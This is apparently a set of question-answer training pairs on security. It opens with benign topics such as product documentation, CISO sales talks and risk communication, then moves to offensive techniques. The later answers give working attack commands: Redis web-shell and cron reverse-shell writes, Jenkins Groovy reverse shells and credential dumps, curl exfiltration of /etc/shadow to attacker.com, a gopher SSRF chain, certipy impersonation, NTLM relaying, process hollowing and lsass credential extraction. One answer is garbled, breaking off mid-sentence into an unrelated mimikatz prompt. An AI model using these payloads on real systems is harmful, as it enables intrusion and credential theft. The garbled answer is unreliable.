(2) Conceptual documentation -- explain the product's model and terminology (what is an 'asset', 'policy', 'case' in your product's vocabulary); architecture overview (what data is collected, how, where it is stored, how it is processed); security model (data isolation, encryption, access control) -- critical for enterprise security buyers. (3) How-to guides -- task-oriented: 'How to connect your AWS account'; 'How to configure SIEM integration'; 'How to create a custom detection rule'; discrete procedures with prerequisites, steps, and expected outcome. (4) Reference documentation -- API reference (OpenAPI spec, auto-generated with examples); CLI reference; configuration file schema; event field glossary. (5) Integration catalogue -- one page per integration: prerequisites, authentication method, data collected, setup steps, troubleshooting. (6) Troubleshooting -- common errors with specific resolution steps; 'Contact Support' as last resort, not first. (7) Release notes -- changelog per release; categorised by: new features, improvements, bug fixes, deprecations; link to updated docs. (8) Security documentation -- dedicated security page for enterprise buyers: SOC 2 report (downloadable after NDA), pen test summary, data retention policy, encryption details, incident notification policy, bug bounty programme link.
How do you run discovery conversations for a security product with a CISO prospect?

CISO discovery conversation framework: (1) Research first -- before the call: review company news (recent breaches, acquisitions, regulation news affecting them), their LinkedIn for the CISO's background and tenure, job postings (signals: hiring a cloud security architect = cloud risk priority; hiring IR analyst = incident occurred or expected), SecurityScorecard/BitSight external risk score (icebreaker: 'I noticed your external attack surface has X exposed services in category Y -- is that something on your radar?'). (2) Opening -- don't pitch first; 'We work with a lot of [industry] CISOs; I'm curious what's top of mind for you this quarter.' This surfaces the CISO's actual priorities. (3) Situation questions -- 'What does your current security stack look like for [problem area]? How long have you had that in place? What's driving the conversation today?' (4) Problem questions -- 'What's the biggest gap in your current coverage? Have you had any incidents that highlighted that gap? What's the cost to you if [problem] goes unaddressed?' (5) Implication questions -- 'If you can't get visibility into [problem], what does that mean for your next audit? How does that affect your ransomware insurance renewal?' (6) Value questions -- 'If you had [the outcome our product delivers], how would that change your team's capacity?' (7) Objection handling -- 'We already have [competitor]': 'What do you use it for? There are typically gaps in [area] that customers find with us.' (8) Next steps -- always propose a specific next step with a deadline.
What does a security product competitive analysis involve?

Security product competitive analysis: (1) Category definition -- define the market category your product competes in (e.g., 'Cloud-Native Application Protection Platform' vs 'Cloud Security Posture Management'); category determines which alternatives buyers consider. (2) Competitor identification -- direct competitors (same problem, same approach), indirect competitors (same problem, different approach), non-consumption (prospect uses a manual process or nothing). (3) Capability matrix -- spreadsheet: your product vs each competitor, rows = buyer's must-have features, score each 1-3 (missing/partial/complete). Avoid listing every feature; focus on what buyers evaluate. (4) Positioning differentiation -- for each competitor: 'We win when...' and 'We lose when...' be honest; identify the scenarios where you genuinely win and focus sales on them. (5) Pricing comparison -- list-price comparison; note pricing model differences (per seat vs per asset vs flat); TCO (Total Cost of Ownership) analysis including integration, professional services, training. (6) G2/Gartner/Forrester reviews -- read competitor reviews for complaint patterns; those are your differentiation opportunities ('Customers complain that [Competitor] is too expensive to deploy -- our lightweight agent deploys in minutes'). (7) Win/loss analysis -- tag every lost deal with loss reason; quarterly review of loss reasons reveals competitive patterns. (8) Battlecards -- one-page per competitor for sales team: overview, how to identify, differentiators, objection responses, proof points. Update quarterly.
Explain technical writing principles for security documentation.

Technical writing principles for security documentation: (1) Audience clarity -- security documentation has multiple audiences: security practitioners (need exact commands and technical depth), developers (need code examples and API details), compliance teams (need control mappings and evidence), executives (need risk language not technical jargon). Write separate documents for each audience or clearly section one document with headers. (2) Active voice and imperative mood -- instruction: 'Run the following command' (not 'The following command should be run'); use second person ('you', 'your'); present tense for current state. (3) Structured content -- use numbered steps for procedures; use headers for navigation (readers scan, not read); short paragraphs (3-4 sentences max); tables for comparing options; code blocks for all commands/code with copy button. (4) Precision -- in security documentation, imprecision causes incidents; be exact about versions, flags, permissions required; distinguish between required and optional steps; call out destructive actions with a warning block. (5) Examples -- every concept gets a concrete example; code examples must be copy-pasteable and actually work; show expected output so readers know if it worked. (6) Maintenance -- documentation that is out of date is worse than no documentation (false confidence); assign a doc owner per article; review trigger: every product release; version-stamp docs with the release they apply to. (7) Accessibility -- alt text for screenshots; don't use colour alone to convey meaning; readable on mobile; searchable (good headings and metadata). (8) Feedback loop -- 'Was this helpful?' on every page; track low-rated pages; developer docs: GitHub Issues for corrections.
Explain systems thinking as applied to security architecture design.

Systems thinking in security architecture: (1) Understand the whole system, not just components -- a system is more than the sum of its parts; a secure application on an insecure network is insecure; a secure network with insecure user behaviour is insecure. Security architecture must address the full sociotechnical system: technology + people + process + environment. (2) Feedback loops -- security controls create feedback loops; a negative feedback loop (balancing) stabilises the system: detect anomaly -> alert -> analyst investigates -> contain threat -> system returns to normal. A positive feedback loop (reinforcing) amplifies: undetected breach -> lateral movement -> more credentials stolen -> wider access -> harder to contain. Design detections that break positive feedback loops early. (3) Emergent properties -- security properties emerge from system interactions, not individual components; a network with MFA + EDR + SIEM + IR process is more than three times as secure as any one of those controls alone; they interact to create defence in depth. (4) Non-linearity -- small changes have outsized effects; one unpatched internet-facing server in a segmented network has much greater risk than its size implies. (5) Delays -- controls often have detection delays; attacker dwell time (average 200 days for advanced attackers); MTTD must be reduced because delayed detection allows adversary to achieve objectives. (6) System boundaries -- define what is inside vs outside your control; accept that cloud provider infrastructure is partially outside your boundary; cloud shared responsibility model defines the boundary explicitly. (7) Leverage points -- changing system goals (security policy and appetite), changing feedback loop structure (better detection), changing delays (reduce MTTD), adding/removing stocks and flows (access control, monitoring).
What is automation design for security operations?

Security automation design principles: (1) Start with high-volume, low-complexity decisions -- automate alert triage for clearly-false positives (e.g., known scanner IP generating port scan alerts -- auto-suppress and add to whitelist); save analyst time for true decisions. (2) Playbook design -- map incident types to structured playbooks; each playbook is: trigger condition -> enrichment steps (pull threat intel, asset info, user context) -> triage logic (automated determination of severity) -> response actions (auto or human-approved) -> notification -> documentation. (3) SOAR architecture -- SOAR (Security Orchestration, Automation and Response) platforms (Palo Alto XSOAR, Splunk SOAR, Tines, Torq) orchestrate across tools via API integrations; build integrations with: EDR (isolate host), AD (disable account), firewall (block IP), ticketing (create Jira ticket), Slack (notify analyst). (4) Human-in-the-loop -- always require human approval for: account lockout (business impact), network isolation (service disruption), external communications; automate everything before and after the decision point. (5) Idempotency -- automation actions must be safe to run multiple times without unintended side effects; blocking an IP that is already blocked should not error. (6) Error handling -- every automated action has a fallback; if the API call to isolate a host fails, create a high-priority ticket and alert an analyst immediately. (7) Audit trail -- log every automated action with: timestamp, trigger alert, actions taken, by which playbook, outcome. Immutable audit log. (8) Testing -- test playbooks against synthetic alerts in a staging environment before production; include negative test cases (playbook should NOT trigger on X).
Explain the concepts behind analytical thinking for cybersecurity problem-solving.

Analytical thinking in cybersecurity: (1) Decomposition -- break complex problems into components: a 'security breach' decomposes into initial access vector, exploitation path, lateral movement path, persistence mechanism, data exfiltration method; investigate each component systematically rather than treating the breach as a monolithic event. (2) Pattern recognition -- experienced security analysts build a library of attack patterns from memory and documentation; recognise when new signals match known patterns (e.g., multiple failed logins then a success from a new IP = credential stuffing pattern); MITRE ATT&CK provides a shared vocabulary for patterns. (3) Hypothesis-driven investigation -- form a falsifiable hypothesis ('I believe the attacker got initial access via phishing'); design tests to confirm or deny (search email logs for malicious attachments delivered to the affected user in the preceding 2 weeks; examine browser history; check DNS queries from the endpoint). (4) Correlation and causation -- correlation in logs (two events occurring close in time) does not imply causation; must establish mechanism (how does A cause B?); resist jumping to conclusions from circumstantial evidence. (5) Cognitive bias awareness -- confirmation bias (seeking evidence that confirms the initial hypothesis; actively seek disconfirming evidence); anchoring (the first suspicious event found anchors the entire investigation; consider alternative initial access paths); availability bias (attributing attacks to the most recent technique read about). (6) Documentation discipline -- write down reasoning, not just conclusions; enables review by others; protects against memory degradation during long incidents.
How do you communicate security risk to non-technical executives?

Communicating security risk to executives: (1) Business language -- replace technical jargon with business impact language. Not: 'We have 47 critical CVEs in our perimeter systems.' Instead: 'Three of our internet-facing customer systems have unpatched vulnerabilities actively being exploited against companies like us; breach of these systems would expose 250,000 customer records and trigger a regulatory notification requirement.' (2) Quantify in dollars -- executives make budget decisions in financial terms; use FAIR quantification: 'The expected annual loss from ransomware attacking our manufacturing systems is $2.3M; the proposed control investment is $400k/year.' (3) Benchmarking -- context reduces anxiety and aids decision-making: 'Our phishing click rate of 22% is above the industry average of 14%; with the proposed training programme, industry benchmarks suggest we can reach 6% within 12 months.' (4) Three options framework -- always present three options with different risk/cost trade-offs; executives want to choose, not just approve; Option A (minimal investment, residual high risk), Option B (recommended -- balanced investment and risk reduction), Option C (maximum investment, minimal residual risk). (5) Analogies -- 'Not having MFA on remote access is like leaving the office front door unlocked at night -- employees can get in, but so can anyone else.' (6) Decision-oriented -- end every risk communication with a clear ask: 'We need board approval for a $500k security programme investment to address these three risks; the alternative is accepting the risk formally.' (7) Avoid fear-mongering -- factual, measured tone; executives who distrust the CISO stop listening.
Explain problem decomposition for a complex security investigation.

Problem decomposition in security investigation: When investigating a complex incident (e.g., 'we think we were compromised but we don't know the scope'), decompose along multiple dimensions: (1) Temporal decomposition -- build a precise timeline: when was the first indicator? What happened before that (precursors)? What happened after? Use log timestamps across all data sources (SIEM, EDR, PCAP, cloud trail) aligned to a single UTC timeline. (2) Spatial decomposition -- which systems are involved? Map the network topology: initial entry point -> pivot points -> destination systems. Use BloodHound (for AD lateral movement) and network flow data to trace the path. (3) Actor decomposition -- single actor or multiple? External or insider? What level of sophistication (script kiddie uses known CVEs with default tool settings; APT uses custom malware with OPSEC)? Attribution evidence: malware samples, C2 infrastructure, TTPs. (4) Data decomposition -- what data was accessed? What was exfiltrated? Cross-reference: access logs + DLP alerts + CASB logs + outbound traffic analysis. (5) Control decomposition -- which controls failed to prevent/detect? Which succeeded? Gap analysis drives remediation. (6) Workstream allocation -- for large incidents, assign team members to parallel workstreams by decomposition dimension: one team on host forensics, one on network forensics, one on cloud trail, one on malware analysis; daily synchronisation meeting to integrate findings. (7) Residual uncertainty -- explicitly track: 'We don't know X because we don't have logs for that system'; document uncertainty for the final report.
How do you build a cybersecurity programme from scratch at a company that has nothing?

Building a security programme from zero: Month 1 (Know your environment): asset inventory -- enumerate everything (cloud accounts, SaaS applications, endpoints, servers, network devices); data classification -- where is your most sensitive data? Who has access? Identity audit -- list all accounts, admin accounts, shared accounts, service accounts; MFA gap analysis. Month 2-3 (Stop the bleeding -- quick wins): deploy MFA for email and remote access (highest ROI control, stops credential attacks); remove unnecessary admin accounts; ensure all internet-facing systems are patched (focus on Critical CVEs); configure automatic updates for endpoints; enable cloud security defaults (Entra security defaults, AWS Security Hub). Month 3-6 (Foundation): deploy EDR on all endpoints; centralised logging (cloud-native SIEM: Microsoft Sentinel, Chronicle, or Splunk Cloud); basic IR playbooks; security awareness training + phishing simulation; vulnerability scanner deployed; patch management process formalised. Month 6-12 (Structure): risk register populated; security policies written; RBAC implemented across major systems; vendor security assessment programme; penetration test (external); incident response plan tested (tabletop exercise). Year 2 (Maturity): SOC 2 Type II or ISO 27001 readiness; threat hunting programme; full coverage monitoring (network, cloud, endpoint, identity); purple team exercises; security metrics dashboard for board. Budget: prioritise MFA > EDR > logging > pen test > everything else. Show ROI: cyber insurance reduction, audit findings closed, incident count trends.
What makes a great CISO and how do they operate strategically?

Effective CISO attributes and operating model: (1) Business acumen -- understand the company's revenue model, customer obligations, regulatory environment, and competitive pressures; security decisions must align with business strategy, not oppose it; 'the business of security is the business.' (2) Risk communication -- translate technical risk into financial and operational language for the board; run risk as a business discipline with quantified decisions, not a compliance exercise. (3) Relationship capital -- CISO effectiveness depends on trust with: CEO (strategic alignment), CFO (budget), CTO/CIO (technical partnership), Legal (regulatory), HR (insider threat, culture), business unit leaders (they own the risk). Build relationships before crises occur. (4) Operating model -- define what the security team owns vs partners with IT, engineering, and legal; write a security charter; avoid being a bottleneck (shift-left, enabling teams to be secure independently). (5) Strategic planning -- 3-year security roadmap aligned to business growth plan; annual plan with quarterly OKRs; tie security maturity milestones to business milestones (SOC 2 before enterprise sales motion, HIPAA before healthcare market entry). (6) Board engagement -- attend board meetings at least quarterly; present using the 'risk dial' concept (how exposed are we vs last quarter and why); never present without a specific ask (budget, policy decision, risk acceptance). (7) Talent strategy -- build vs buy vs partner; security talent is scarce; culture and mission attract talent more than salary at the margins; invest in internal development. (8) Continuous learning -- threat landscape changes constantly; read Mandiant/CrowdStrike annual threat reports; engage with ISAC (Information Sharing and Analysis Centre) for sector-specific intel.
Explain heap exploitation using tcache poisoning in glibc 2.32+.

Tcache (thread-local cache) was introduced in glibc 2.26 as a per-thread free list for small allocations. In glibc 2.28+, tcache entries have a key field (a pointer to the tcache_perthread_struct) to detect double-free. In glibc 2.32+, tcache next pointer is mangled (XOR with heap address shifted right 12 bits) to prevent direct pointer overwrite. Exploit with safe-linking bypass: when reading the next pointer of a freed chunk, unmangle it: `mangle = (pos >> 12) ^ ptr` where pos is the address of the chunk. To overwrite: control an allocation that overwrites the mangled next pointer of a freed tcache chunk with `(attacker_target >> 12) ^ (heap_base >> 12)`. Two allocations then yield a chunk at attacker_target. Technique to leak heap base: the first tcache chunk's next pointer is NULL, stored as `(chunk_addr >> 12) ^ 0 = chunk_addr >> 12`; partial overwrite the LSB to redirect to a nearby heap address; free and allocate to obtain a chunk at the leaked region, revealing the heap base. Exploit flow: double-free a chunk (bypass key check by zero-ing the key field via heap overflow or UAF write); overwrite mangled next with target address (with correct mangling using leaked heap base); allocate twice; second allocation is at target (e.g., __malloc_hook or a libc global, or a GOT entry). __malloc_hook was removed in glibc 2.34; post-2.34 targets: __libc_IO_vtables, environ (libc pointer to stack address for ROP).
How does kernel exploitation differ from userland exploitation?

Kernel exploitation targets the operating system kernel (ring 0). Key differences from userland: (1) Primitives are different -- kernel memory is shared across all processes; a read primitive leaks kernel addresses (defeating KASLR); a write primitive can overwrite any data structure. Common targets: cred struct (uid/gid for the current process, overwrite to 0 = root), modprobe_path (path of binary executed as root when unknown file format is executed -- overwrite with /tmp/evil), function pointers in kernel structures (overwrite with ROP gadget or shellcode). (2) KASLR (Kernel Address Space Layout Randomisation) -- kernel base randomised at boot; defeated by: leaking a kernel pointer via an info leak vulnerability (/proc/kallsyms if readable, side-channel timing attacks, or the vulnerability itself leaking a pointer). (3) SMEP (Supervisor Mode Execution Prevention) -- prevents kernel from executing userland code; defeated by ROP chains using kernel gadgets. SMAP (Supervisor Mode Access Prevention) -- prevents kernel from accessing userland data without explicit STAC/CLAC; defeats passing shellcode pointers in userland memory. (4) Kernel ROP -- chain kernel gadgets (find with ROPgadget --binary vmlinux); pivot to kernel stack; execute: commit_creds(prepare_kernel_cred(0)) to gain root. (5) Context -- after exploitation, return cleanly to userland (swapgs; iretq or SYSRET); crash-free return is essential as a kernel panic is detectable and takes down the system. (6) Exploit reliability -- kernel has no ASLR variance between processes but does have between boots; one-shot exploit must work reliably. Tools: syzkaller (kernel fuzzer), pwndbg for kernel debugging via QEMU.
Explain Windows kernel exploitation and Driver exploitation basics.

Windows kernel exploitation: (1) Attack surface -- kernel drivers are a primary attack surface; IOCTLs (I/O Control codes) are handled by driver dispatch routines; user mode sends IOCTL via DeviceIoControl to a driver device object; if the driver doesn't validate input size or content, it's exploitable. (2) Finding vulnerabilities -- WinDBG with kernel debugging (2-machine setup or QEMU); IDA Pro / Ghidra to reverse driver binaries; IOCTL fuzzing (Driver Fuzzing Framework, ioct fuzzer). (3) Common vulnerability classes -- stack overflow in IOCTL handler; arbitrary kernel memory read/write; use-after-free in driver object management; type confusion in IOCTL dispatch. (4) Exploitation primitives -- arbitrary kernel write: overwrite HalDispatchTable+0x8 (HalpQuerySystemInformation) -- a common target; call NtQueryIntervalProfile in userland which calls through HalDispatchTable; this executes attacker's shellcode. Alternative: overwrite token of current process (SYSTEM token steal): shellcode walks EPROCESS list, finds SYSTEM process (PID 4), copies its token to current process's EPROCESS.Token. (5) BYOVD (Bring Your Own Vulnerable Driver) -- if kernel exploit requires vulnerable driver, attackers load a legitimate signed-but-vulnerable driver (e.g., AV drivers, hardware vendor drivers with CVEs) to gain kernel code execution; then use it as a stepping stone. Msi Afterburner's RTCore64.sys, Intel's iqvw64e.sys are known BYOVD targets. (6) Mitigations -- HVCI (Hypervisor-Protected Code Integrity) prevents loading of unsigned or maliciously signed code in kernel via VTL1 enforcement; DSE (Driver Signature Enforcement) blocks unsigned drivers; bypass requires a signed driver with a vulnerability.
How do you reverse engineer a malware sample systematically?

Systematic malware reverse engineering: (1) Safe environment -- execute and analyse only in an isolated VM (FlareVM on Windows, REMnux on Linux); snapshot before execution; disable network or use FakeNet-NG to simulate network responses and capture C2 traffic. (2) Static analysis (pre-execution): file type and hash (file, md5sum, VirusTotal submission); strings extraction (strings -a; FLOSS for decoded strings including stack strings and encoded strings); PE analysis (PE-bear, pestudio): imports (DLL/function names reveal capability -- CreateRemoteThread = injection, CryptEncrypt = ransomware, InternetOpenA = network C2), exports, sections (high entropy section = packed/encrypted code), compile timestamp, certificate. Detect packing: UPX, Themida, MPRESS; unpack with upx -d or manually. (3) Dynamic analysis (execution): Process Monitor (file/registry/network activity), Process Hacker (running processes, loaded DLLs, handles), Wireshark/FakeNet-NG (C2 protocol), Autoruns (persistence added), x64dbg with ScyllaHide (anti-debug bypass). (4) Code analysis (IDA Pro / Ghidra / Binary Ninja): start at entrypoint; rename functions as purpose becomes clear; identify crypto constants (find crypt search in IDA: AES S-box, RC4 PRNG, XOR keys); trace the main execution path; identify C2 communication function (connect, send, recv patterns). (5) Deobfuscation -- XOR decode with identified key; base64 decode; RC4 decrypt C2 config (IDA scripting or CyberChef). (6) Report -- IOCs (hashes, IPs, domains, mutex names, registry keys, file paths); capabilities mapped to MITRE ATT&CK; YARA rule from unique byte sequences.
How do you write a YARA rule for a new malware family?

YARA rule writing process: (1) Collect samples -- get 3-5 samples of the malware family to find consistent artefacts; check: are they from the same family (VirusTotal/Intezer clustering)? (2) Extract unique strings -- run FLOSS on all samples; look for strings that appear in ALL samples (family-consistent) but NOT in benign software (low false positives). Candidate string types: C2 URLs/domains (most specific); mutex names (unique per family: 'Global\WindowsUpdateMutex327842'); User-Agent strings; error messages or log strings embedded by the developer; encoded configuration markers. (3) Extract unique byte sequences -- in IDA, find characteristic code: crypto implementations, obfuscation routines, specific API call sequences; export as hex; verify across samples. (4) Test for false positives -- run candidate rule against: clean Windows install, common software corpus (VirusTotal Livehunt or a local corpus). Strings in common libraries (MSVC runtime, Windows API) generate false positives. (5) Write the rule:
```yara
rule Malware_FamilyX_v1 {
 meta:
 description = "Detects FamilyX based on C2 config and mutex"
 author = "Researcher"
 date = "2025-01-01"
 reference = "SHA256:abc123"
 mitre_attack = "T1071.001"
 strings:
 $mutex = "Global\\WinUpdate3278" ascii wide
 $c2_cfg = { 68 74 74 70 73 3A 2F 2F } // https:// in config
 $crypto_routine = { 31 C0 89 45 ?? 8B 45 ?? XOR ?? [2] 83 C0 01 }
 condition:
 uint16(0) == 0x5A4D and // PE file
 ($mutex and $c2_cfg) or
 $crypto_routine
}
```
(6) Tune threshold -- if false positives found, make condition more restrictive (require more strings, check PE characteristics, check entropy of specific sections). Deploy to: VirusTotal Livehunt, EDR YARA scanning, Elastic, Splunk.

Explain process hollowing in detail with code structure.

Process hollowing (T1055.012): creates a legitimate process in suspended state, hollows out its executable image, and replaces it with malicious code. The process appears as a legitimate binary in task manager. Steps: (1) Create suspended process -- CreateProcess with CREATE_SUSPENDED flag; legitimate target (e.g., svchost.exe, notepad.exe). (2) Read base address -- from PEB (Process Environment Block) of the suspended process; NtQueryInformationProcess with ProcessBasicInformation returns PBI.PebBaseAddress; read the ImageBaseAddress field at offset 0x10 (x64). (3) Unmap the image -- NtUnmapViewOfSection(hProcess, remote_imagebase) removes the original image from the process. (4) Allocate space for malicious PE -- VirtualAllocEx at the preferred ImageBase of the malicious PE (or at any address if ASLR); PAGE_EXECUTE_READWRITE. (5) Write PE headers and sections -- WriteProcessMemory for the PE headers; iterate the PE section table and write each section to the correct RVA. (6) Fix relocations -- if malicious PE is not loaded at its preferred base, apply the relocation table (delta = actual_base - preferred_base; add delta to each relocation entry). (7) Fix imports -- iterate the Import Directory; resolve each imported function by loading the required DLL in the remote process (LoadLibrary via CreateRemoteThread); write the function addresses into the IAT. (8) Update PEB ImageBaseAddress -- write the new ImageBase into the suspended process's PEB. (9) Set thread context -- GetThreadContext; modify Rcx (x64 entrypoint); SetThreadContext. (10) Resume thread -- ResumeThread. Detection: Sysmon event 8 (remote thread creation); PE header mapped to private memory (not backed by a file on disk); PEB ImageBase does not match the on-disk PE at that path (AV hook on NtQueryInformationProcess); process start without matching file hash.
Explain how to exploit an unauthenticated Redis instance.

Redis exploitation (unauthenticated instance on 6379): (1) Confirm access: redis-cli -h target ping; if PONG, full access. (2) Information gathering: INFO server (version, OS, config file path); INFO keyspace (databases and key counts); CONFIG GET dir (working directory); CONFIG GET dbfilename (RDB file name). (3) File write -- set a key to a malicious payload, then CONFIG SET dir and CONFIG SET dbfilename to write the RDB dump to an arbitrary path: redis-cli -h target CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET shell '<?php system($_GET["cmd"]); ?>'; BGSAVE -- writes an RDB file that contains the PHP key in binary; PHP will execute it despite binary garbage (PHP ignores non-PHP content). Alternatively write to /root/.ssh/authorized_keys: SET key "

attacker_public_key

"; CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; BGSAVE. (4) Cron job -- write a crontab: CONFIG SET dir /var/spool/cron/crontabs; CONFIG SET dbfilename root; SET cron "

* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1

"; BGSAVE. (5) Redis replication RCE (Redis 4.x/5.x) -- attackers use a rogue Redis master that sends a malicious module (redis-rogue-server); target connects as a slave and loads the attacker's.so module; the module provides an eval command that runs OS commands. (6) Redis Cluster -- if cluster mode, enumerate all nodes: CLUSTER NODES.
How do you exploit a Jenkins instance for initial access and post-exploitation?

Jenkins exploitation: (1) Discovery -- Shodan: 'Jenkins' product; default port 8080; look for 'Sign In' page without auth or with default credentials (admin:admin, jenkins:jenkins). (2) Unauthenticated script console -- older Jenkins instances (or misconfigured) expose /script without authentication; Groovy script console = RCE: 'println "id".execute().text'. (3) Authenticated script console -- with valid credentials (/script endpoint): println(['bash','-c','bash -i >& /dev/tcp/attacker/4444 0>&1'].execute().text). (4) Credential exposure -- Jenkins stores credentials in /var/lib/jenkins/credentials.xml and secrets/master.key; with script console: import jenkins.model.Jenkins; Jenkins.instance.credentials.credentials.each { c -> println c.class.name + ': ' + c.dump() }; extracts SSH keys, API tokens, cloud credentials used in pipelines. (5) Pipeline exploitation -- if attacker can create or modify a Jenkinsfile (via SCM write access or pipeline job config), inject malicious build steps: sh 'curl attacker.com/$(cat /etc/shadow | base64)'. (6) CVE-2024-23897 (Jenkins arbitrary file read) -- unauthenticated; read /etc/passwd, Jenkins config, and binary files via the CLI parser; can escalate to RCE by reading the secret.key and crafting an authenticated session. (7) Lateral movement from Jenkins -- Jenkins agents often have access to cloud provider credentials (AWS role, GCP SA), source code repositories, deployment keys for production systems; these are the real prize.
Explain Responder and LLMNR/NBT-NS poisoning attacks.

Responder poisons LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) broadcast protocols used by Windows to resolve hostnames that DNS fails to resolve. Attack: (1) When a Windows host attempts to access \\FILESHAR (a typo or non-existent host), DNS returns NXDOMAIN; Windows falls back to LLMNR broadcast (UDP 5355) asking 'who is FILESHAR?'; any host can respond. (2) Responder responds to ALL such queries with its own IP, acting as the requested host. (3) Windows attempts authentication to Responder's fake service (SMB, HTTP, FTP, LDAP, MSSQL, etc.) and sends NTLMv2 hashes. (4) Responder captures the NTLMv2 challenge-response hashes. hashcat -m 5600 to crack offline (NTLMv2 is ~1B hashes/sec on a GPU). Run: sudo responder -I eth0 -dwPv (-d: DHCP poisoning; -w: WPAD; -P: ProxyAuth; -v: verbose). File: /usr/share/responder/logs/ contains captured hashes. Simultaneous NTLM relay: run responder with --disable-esmtp and run ntlmrelayx.py -tf targets.txt --smb2support; ntlmrelayx relays captured auth to target machines (must have SMB signing disabled -- the majority of workstations); if target allows the user's level of access, ntlmrelayx creates an interactive SMB shell or dumps SAM. Defence: disable LLMNR (GPO: Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution = Enabled); disable NBT-NS (NIC properties > IPv4 > Advanced > WINS > Disable NetBIOS over TCP/IP); enforce SMB signing on all machines (GPO).
Explain prototype pollution attacks in JavaScript and how to exploit them.

Prototype pollution exploits JavaScript's prototype chain. Every object inherits from Object.prototype; if an attacker can modify Object.prototype, all objects in the application are affected. Sources of prototype pollution: (1) Merge/deep-clone functions that don't sanitise __proto__ or constructor.prototype keys: merge(obj, {"__proto__": {"admin": true}}) -- the __proto__ key assignment pollutes the prototype. (2) Library-level: lodash < 4.17.20, jQuery ($.extend deep), Hoek, query-string parsing (?__proto__[admin]=true), and many others have had prototype pollution CVEs. Exploitation scenarios: (1) Client-side -- pollute a property checked by application logic: Object.prototype.isAdmin = true; any obj.isAdmin check returns true. (2) Server-side Node.js -- pollute Object.prototype.shell = 'node'; spawn a child_process exec call that uses these prototype properties (Pug template engine prototype pollution to RCE: pollute Object.prototype.block.body leading to code injection in template compilation). (3) JSON merge gadgets -- express framework reading options from obj that fall back to Object.prototype values. Detection: search for merge/assign/extend calls with user-controlled input; look for qs library (query string parsing); test by submitting {"__proto__":{"testpollution":"polluted"}} and checking if a new object has testpollution. Fix: use Object.create(null) for objects used as hash maps; sanitise __proto__ and constructor in merge functions; use JSON.parse safeguards.
How do you chain vulnerabilities for maximum impact in a web application?

Vulnerability chaining example -- going from low-severity SSRF to full system compromise: (1) Discover SSRF -- a PDF generation feature takes a URL parameter; the server-side renderer fetches the URL and embeds content. Initial finding: low-severity SSRF (can fetch internal URLs). (2) Map internal services -- use the SSRF to scan internal ports: try http://127.0.0.1:PORT for common internal services; discover http://127.0.0.1:6379 (Redis, returns -ERR wrong number of arguments) and http://localhost:8500 (Consul admin API). (3) Exploit Redis via SSRF using Gopher protocol -- gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall... sends Redis commands through the SSRF; write cron job to /var/spool/cron/crontabs/root; RCE as root obtained. (4) Post-exploitation -- from RCE on the server: access cloud metadata (curl 169.254.169.254) to get IAM role credentials; use credentials to enumerate S3 buckets and find a bucket containing customer data. (5) Alternative chain: SSRF -> Consul HTTP API (/v1/agent/service/register) -> register a check with a shell command -> Consul executes command as root. (6) Second example -- XSS to account takeover: stored XSS in a profile field -> victim visits their own profile -> XSS executes -> fetch CSRF token from the page -> send a request to change email address -> account takeover. Chaining rule: the highest-impact vulnerability in the chain determines the overall severity; each link must be exploitable in sequence.
How do you write Burp Suite extension logic for custom security testing?

Burp Suite extension development (using Montoya API in Java/Python): (1) Extension structure -- implement BurpExtension interface; register handlers in initialize(): IHttpHandler for passive scanning on all traffic; IScannerCheck for active scan checks; IContextMenuItemsProvider for right-click actions. Write a Python port of mimikatz's sekurlsa::logonpasswords logic conceptually.

Conceptual mimikatz credential extraction (educational -- process for understanding Windows security): lsass.exe stores credentials in its process memory in structures managed by various Security Support Provider (SSP) DLLs. Extraction process: (1) Open lsass with SeDebugPrivilege: OpenProcess(PROCESS_ALL_ACCESS, lsass_pid). (2) Identify the Windows version to find structure offsets (offsets change per patch level). (3) For NTLM credentials (wdigest / lsasrv): in Windows 7 and earlier, WDigest SSP cached plaintext passwords; in Windows 8+ it's disabled by default (UseLogonCredential=0 in HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest). (4) For NT hashes (kerberos): MSV1_0 authentication package stores NT hashes in LSASS memory in the MSV1_0_PRIMARY_CREDENTIAL structure; offsets from lsasrv.dll pattern scan. (5) Memory reading pattern: VirtualQueryEx to enumerate memory regions; ReadProcessMemory to read lsasrv.dll's data sections; pattern scan for known byte sequences before credential structures; follow pointers to UNICODE_STRING structures containing username and encrypted password. (6) Decryption: in Windows 8.1+, credentials are encrypted with LSASS-internal AES/3DES keys stored in lsasrv.dll memory; mimikatz reads these keys using known patterns and decrypts the credential buffers with BCryptDecrypt. Defensive countermeasures: Protected Process Light (PPL) for lsass prevents arbitrary process handle; Credential Guard (VBS + UEFI) moves credential storage to a VSM enclave unreachable from the normal OS; both require mimikatz to use a kernel driver bypass.
Explain Active Directory Certificate Services (ADCS) attacks.

ADCS (Active Directory Certificate Services) is a PKI implementation that has been shown to have numerous critical vulnerabilities (SpecterOps ESC1-ESC13 research, 2021). Common escalation paths: (1) ESC1 -- certificate template allows requesters to specify a subjectAlternativeName (SAN); any domain user can request a certificate with Administrator as the SAN and authenticate as Administrator to obtain a TGT. certipy req -ca corp-CA -template VulnTemplate -upn administrator@corp.local -dc-ip DC_IP. (2) ESC2 -- template has the Any Purpose EKU or no EKU; the certificate can be used for any purpose including client authentication; same exploit chain as ESC1. (3) ESC3 -- template with Certificate Request Agent EKU; allows requesting certificates on behalf of other principals; use to obtain a certificate as any user including Domain Admins. (4) ESC4 -- template has WRITE access for a low-privileged principal (e.g., Domain Users); attacker modifies template to add SAN extension (turning it into ESC1). (5) ESC6 -- CA is configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag; any template can be exploited for SAN-based impersonation. (6) ESC8 -- Web Enrollment (HTTP) endpoint accepts NTLM auth and can be relayed (no Extended Protection for Authentication by default); relay NTLM from a DC (via PetitPotam coercion) to the ADCS web enrollment to obtain a DC certificate; then perform DCSync with the DC certificate via PKINIT (Pass-the-Certificate). Certipy tool automates all ESC discovery (certipy find -dc-ip IP -u user -p pass) and exploitation.
Explain Golden Ticket and Silver Ticket Kerberos attacks.

